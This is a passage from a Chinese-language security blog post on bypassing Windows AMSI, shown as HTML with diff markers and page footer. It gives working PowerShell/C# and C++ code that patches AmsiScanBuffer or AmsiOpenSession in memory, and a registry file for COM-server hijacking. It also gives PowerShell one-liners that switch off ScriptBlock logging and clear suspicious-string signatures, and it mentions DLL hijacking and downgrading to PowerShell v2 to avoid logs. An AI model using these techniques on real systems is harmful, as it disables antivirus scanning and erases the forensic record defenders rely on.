+<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$p=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;</span>isma<span class="string">&quot;;</span></span><br><span class="line"><span class="string">String b =</span></span><br><span class="line"><span class="string">&quot;</span>reffuBnacSismA<span class="string">&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">.dll<span class="string">&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib, String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">,</span></span><br><span class="line"><span class="string">b.Reverse().ToArray()));</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0x57;</span></span><br><span class="line"><span class="string">p[2] = 0x00;</span></span><br><span class="line"><span class="string">p[3] = 0x07;</span></span><br><span class="line"><span class="string">p[4] = 0x80;</span></span><br><span class="line"><span class="string">p[5] = 0xc3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>@</span><br><span class="line">Add-Type $p</span><br><span class="line">[<span class="meta">Program</span>]::Bypass()</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的功能就是在<code>AmsiScanBuffer</code>的函数地址处直接打补丁，补丁汇编是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x80070057</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><code>0x80070057</code>也就是<code>-2147024809</code>，是一个负数，当然也可以是其他负数，而<code>AmsiScanBuffer</code>也可以修<br>改成<code>AmsiOpenSession</code>。怎么把汇编代码转换成代码中的数组呢？使用<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%88%E5%BF%AB%E8%BD%AC%E6%8D%A2%E3%80%82%E6%88%91%E4%BB%AC%E6%9D%A5%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%E4%B8%8B%EF%BC%9A">https://defuse.ca/online-x86-assembler.htm#disassembly，可以很快转换。我们来修改代码测试下：</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span>=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;isma&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">.dll&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib,</span></span><br><span class="line"><span class="string">&quot;AmsiOpenSession&quot;);</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0xFF;</span></span><br><span class="line"><span class="string">p[2] = 0xFF;</span></span><br><span class="line"><span class="string">p[3] = 0xFF;</span></span><br><span class="line"><span class="string">p[4] = 0xFF;</span></span><br><span class="line"><span class="string">p[5] = 0xC3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$p</span></span><br><span class="line">[<span class="type">Program</span>]::Bypass()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们修改了被打补丁的函数为AmsiOpenSession,补丁汇编代码为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,-1</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>我们知道了补丁函数可以为AmsiOpenSession、AmsiScanBuffer，补丁代码可以变化很<br>多，只要返回结果为负数就行。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -NoExit dir&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">    HMODULE hAmsi = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;amsi.dll&quot;</span>);</span><br><span class="line">    LPVOID pAmsiScanBuffer = <span class="built_in">GetProcAddress</span>(hAmsi, <span class="string">&quot;AmsiScanBuffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="keyword">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pAmsiScanBuffer, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (LPVOID)pAmsiScanBuffer, &amp;patch, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pAmsiScanBuffer, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hAmsi);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>0xc3的硬编码对应的汇编是ret，也就是调用AmsiScanBuffer直接让他返回。这个马是直接被杀的。</p>
+<h2 id="非主流对抗"><a href="#非主流对抗" class="headerlink" title="非主流对抗"></a>非主流对抗</h2><h3 id="1-劫持amsi-dll"><a href="#1-劫持amsi-dll" class="headerlink" title="1.劫持amsi.dll"></a>1.劫持amsi.dll</h3><p>其实就是白加黑，以前做过一次分享，讲的很菜，视频也没有公开。具体原理不再多说，网上有很多。</p>
+<p>正常amsi.dll存在于<code>c:\windows\system32\amsi.dll</code>，使用 Aheadlib工具生成或者自己找到 amsi.dll 对应的导出函数，自己写，一样的。当然自己的dll没有签名，这里还涉及到免杀的问题，如果可以添加微软前面，再劫持，又有很大的可玩性。</p>
+<h3 id="2-NULL字符绕过"><a href="#2-NULL字符绕过" class="headerlink" title="2.NULL字符绕过"></a>2.NULL字符绕过</h3><p>这个方法已经失效了，但还是提一下，扩充下思路。</p>
+<p>Amsi扫描使用的是 <code>AmsiScanString</code>函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT WINAPI <span class="title">AmsiScanString</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_LPCWSTR string, <span class="comment">// Will be terminated at the first null</span></span></span></span><br><span class="line"><span class="params"><span class="function">character</span></span></span><br><span class="line"><span class="params"><span class="function">_In_LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_HAMSISESSION session,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_AMSI_RESULT *result</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中string就是脚本内容，在执行脚本之前加个空字符就可以截断，而修复的方法是用了 <code>AmsiScanBuffer</code>这个函数，所以amsi才会用这两个函数来扫描</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT WINAPI <span class="title">AmsiScanBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_	HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_	PVOID buffer, <span class="comment">// Not terminated at the null character</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ 	ULONG length,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_	LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ 	opt_HAMSISESSION session,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_ 	AMSI_RESULT *result</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-COM-server劫持"><a href="#3-COM-server劫持" class="headerlink" title="3.COM server劫持"></a>3.COM server劫持</h3><p>原理：amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先<br>从注册表HKCU中找对应的dll去解析，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了。简单来说利用的是注册表优先级来绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;fdb00e52-a214-4aa1-8fba-</span><br><span class="line">4357bb0072ec&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;fdb00e52-a214-4aa1-8fba-4357bb0072ec&#125;\InProcServer32]</span><br><span class="line">@=&quot;C:\\goawayamsi.dll&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>而微软通过直接调用amsi.dll 的 <code>DllGetClassObject()</code> 函数替换 <code>CoCreateInstance()</code>，<br>可以避免注册表解析。</p>
+<p>但是这种方法也失效了，不过可以学习下思路。</p>
+<h2 id="Powershell-版本特性"><a href="#Powershell-版本特性" class="headerlink" title="Powershell 版本特性"></a>Powershell 版本特性</h2><h3 id="PowerShell-V2"><a href="#PowerShell-V2" class="headerlink" title="PowerShell V2"></a>PowerShell V2</h3><p>PowerShell V2提供事件记录能力，可以协助蓝队进行相关的攻击事件推断和关联性分析，但是其日志记录单一，相关Post-Exploitation可做到无痕迹；并且因为系统兼容性，在后续版本攻击者都会尝试降级至此版本去躲避日志记录。</p>
+<h3 id="PowerShell-V3-V4"><a href="#PowerShell-V3-V4" class="headerlink" title="PowerShell V3/V4"></a>PowerShell V3/V4</h3><p>PowerShell V3/V4 相比之前提供了更全面的日志记录功能。Windows PowerShell 3.0 改进了对命令和模块的日志记录和跟踪支持。 自PowerShell v3版本以后支持启用PowerShell模块日志记录功能，并将此类日志归属到了4103事件。PowerShell模块日志可以配置为记录所有的PowerShell模块的活动情况，包括单一的PowerShell命令、导入的模块、远程管理等。可以通过GPO进行启用模块日志记录。</p>
+<h3 id="PowerShell-V5"><a href="#PowerShell-V5" class="headerlink" title="PowerShell V5"></a>PowerShell V5</h3><p>PowerShell V5加入了CLM和ScriptBlock日志记录功能，能去混淆PowerShell代码并记录到事件日志。随着PowerShell攻击技术的不断成熟，攻击者为了规避防护和日志记录进行了大量的代码混淆，在执行代码之前很难发现或确认这些代码实际上会做些什么事情，给攻击检测和取证造成了一定的困难，因此微软从PowerShell5.0开始加入了日志转储、ScriptBlock日志记录功能，并将其归入到事件4104当中，ScriptBlock Logging提供了在事件日志中记录反混淆的 PowerShell 代码的能力。</p>
+<h3 id="PowerShell-V6"><a href="#PowerShell-V6" class="headerlink" title="PowerShell V6"></a>PowerShell V6</h3><p>PowerShell V6 出于功能需求，提供了更全面的系统覆盖能力。由于PowerShell在Linux和MacOS等操作系统上的支持在MacOS上安装（pwsh），处于安全性考虑日志记录作为必不可少的一部分，PowerShell使用本机os_log API登录Apple的统一日志记录系统。在Linux上，PowerShell使用Syslog，微软将此上升成为一种几乎全平台支持的日志记录解决方案。</p>
+<h3 id="PowerShell-V7"><a href="#PowerShell-V7" class="headerlink" title="PowerShell V7"></a>PowerShell V7</h3><p>PowerShell V7（PS7）基于.NET Core 3.0，Microsoft旨在提供与Windows PowerShell模块更高的兼容性，高达90％。作为PowerShell 7的一部分，Microsoft在之前的日志记录基础上，增加了一种安全使用本地或远程存储中的凭据的方法，以便不需要将密码嵌入到脚本中。还将改进日志记录，以提供将本地计算机日志发送到远程设备的机制，而不管原始操作系统如何。</p>
+<p>这里要说的是V5的脚本日志记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 按Win+R打开Windows运行窗口,在输入框里输入gepdit.msc,打开Windows本地组策略编辑器;</span><br><span class="line">2. 找到计算机配置/管理模板/Windows组件/Windows Powershell，根据需求打开右侧所需要的日志功能;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/01/23/AMSI/image-20220105004129848.png" alt="image-20220105004129848"></p>
+<p>我们可以通过操作注册表的方式，将日志功能关闭。（Empire框架目前已经将该功能整合到payload中）利用如下代码即可</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$settings</span> = [<span class="type">Ref</span>].Assembly.GetType(<span class="string">&quot;System.Management.Automation.Utils&quot;</span>).GetField(<span class="string">&quot;cachedGroupPolicySettings&quot;</span>,<span class="string">&quot;NonPublic,Static&quot;</span>).GetValue(<span class="variable">$null</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$settings</span>[<span class="string">&quot;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot;</span>] = <span class="selector-tag">@</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$settings</span>[<span class="string">&quot;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot;</span>].Add(<span class="string">&quot;EnableScriptBlockLogging&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PowerShell-记录可疑字符串"><a href="#PowerShell-记录可疑字符串" class="headerlink" title="PowerShell 记录可疑字符串"></a>PowerShell 记录可疑字符串</h3><p>Powershell v5版本之后，可记录可疑的字符串，如’Add-Type’、’CreateType’等。可通过如下代码降低策略强度</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&quot;System.Management.Automation.ScriptBlock&quot;</span>).GetField(<span class="string">&quot;signatures&quot;</span>,<span class="string">&quot;NonPublic,static&quot;</span>).SetValue(<span class="variable">$null</span>, (<span class="built_in">New-Object</span> <span class="string">&#x27;System.Collections.Generic.HashSet[string]&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AMSI被开发出的时间不长，所以对抗程度也没有很激烈，稍微混淆一下就可以绕过。其实很多杀软也是，绕过的原理都是相同的，万变不离其宗。不过还是要会写代码，对powershell这门语言熟悉才可以更好的混淆</p>
+<p>附上一个平台：<a target="_blank" rel="noopener" href="https://amsi.fail/">AMSI.fail</a>  可以玩一玩</p>
+<p>参考文章：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">《Bypass AMSI的前世今生》by L.N.</span><br></pre></td></tr></table></figure>
+
+<p>Peace.</p>
+
+  </div>
+</article>
+
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: '7u7uebjtVAc7zqC8W6KLczVp-gzGzoHsz',
+            appKey: 'MWpJPixdx6qnP8OBPnTR7Yd9',
+            placeholder: '',
+            avatar: 'mp'
+        })
+    </script>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links">Links</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EAMSI"><span class="toc-number">1.</span> <span class="toc-text">关于AMSI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AMSI%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">AMSI的调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%B5%81%E5%AF%B9%E6%8A%97"><span class="toc-number">2.</span> <span class="toc-text">主流对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%99%8D%E7%BA%A7"><span class="toc-number">2.1.</span> <span class="toc-text">1.降级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8B%86%E5%88%86"><span class="toc-number">2.2.</span> <span class="toc-text">2.拆分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%A6%81%E7%94%A8AMSI"><span class="toc-number">2.3.</span> <span class="toc-text">3.改注册表禁用AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%80%E9%94%AE%E5%85%B3%E9%97%ADAMSI"><span class="toc-number">2.4.</span> <span class="toc-text">4.一键关闭AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81"><span class="toc-number">2.5.</span> <span class="toc-text">5.内存补丁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demo"><span class="toc-number">2.5.1.</span> <span class="toc-text">demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E4%B8%BB%E6%B5%81%E5%AF%B9%E6%8A%97"><span class="toc-number">3.</span> <span class="toc-text">非主流对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8A%AB%E6%8C%81amsi-dll"><span class="toc-number">3.1.</span> <span class="toc-text">1.劫持amsi.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-NULL%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">2.NULL字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-COM-server%E5%8A%AB%E6%8C%81"><span class="toc-number">3.3.</span> <span class="toc-text">3.COM server劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="toc-number">4.</span> <span class="toc-text">Powershell 版本特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V2"><span class="toc-number">4.1.</span> <span class="toc-text">PowerShell V2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V3-V4"><span class="toc-number">4.2.</span> <span class="toc-text">PowerShell V3&#x2F;V4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V5"><span class="toc-number">4.3.</span> <span class="toc-text">PowerShell V5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V6"><span class="toc-number">4.4.</span> <span class="toc-text">PowerShell V6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V7"><span class="toc-number">4.5.</span> <span class="toc-text">PowerShell V7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-%E8%AE%B0%E5%BD%95%E5%8F%AF%E7%96%91%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">4.6.</span> <span class="toc-text">PowerShell 记录可疑字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2022/01/23/AMSI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/01/23/AMSI/&text=How to Bypass AMSI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/01/23/AMSI/&is_video=false&description=How to Bypass AMSI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=How to Bypass AMSI&body=Check out this article: https://0range-x.github.io/2022/01/23/AMSI/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/01/23/AMSI/&name=How to Bypass AMSI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
